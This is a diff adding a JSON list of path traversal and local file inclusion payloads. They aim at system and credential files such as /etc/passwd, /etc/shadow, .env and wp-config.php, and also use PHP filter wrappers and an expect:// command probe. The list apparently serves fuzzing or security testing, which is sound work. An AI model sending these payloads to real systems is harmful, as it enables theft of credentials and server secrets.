@@ -1,0 +1,19 @@
+[
+  "../../../etc/passwd",
+  "../../../etc/shadow",
+  "../../../etc/hosts",
+  "../../../proc/self/environ",
+  "../../../proc/self/fd/0",
+  "../../../proc/self/cmdline",
+  "../../../proc/version",
+  "../../../.git/config",
+  "../../../.env",
+  "../../../wp-config.php",
+  "../../../config/database.php",
+  "../../../app/config/parameters.yml",
+  "php://filter/read=convert.base64-encode/resource=index.php",
+  "php://filter/convert.base64-encode/resource=config.php",
+  "php://filter/read=string.rot13/resource=index.php",
+  "expect://id",
+  "file:///etc/passwd"
+]
